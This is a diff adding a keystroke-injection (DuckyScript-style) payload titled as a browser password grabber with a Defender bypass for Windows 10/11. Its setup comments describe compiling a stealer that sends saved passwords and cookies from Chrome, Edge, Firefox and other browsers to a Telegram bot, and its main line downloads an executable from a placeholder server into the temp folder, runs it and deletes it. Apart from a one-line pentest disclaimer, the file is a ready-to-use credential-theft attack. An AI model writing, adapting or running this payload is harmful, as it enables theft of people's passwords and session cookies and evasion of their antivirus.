@@ -1,0 +1,16 @@
+REM Title: Browser Password Grab - All Browsers (Defender Bypass)
+REM Description: Chrome, Edge, Opera, Opera GX, Brave, Vivaldi, Firefox + Cookies
+REM Author: Tsali
+REM Target: Windows 10/11
+REM For authorized penetration testing only
+REM
+REM SETUP:
+REM 1. Compile browser_grab.c from tools/src/ with your Telegram bot token and chat ID
+REM 2. Host the compiled .exe on your server
+REM 3. Update the URL below to point to your hosted .exe
+REM
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd /c curl -s -o %temp%\svc.exe http://YOUR_SERVER/browser_grab.exe && %temp%\svc.exe && timeout /t 5 /nobreak >nul && del %temp%\svc.exe
+ENTER
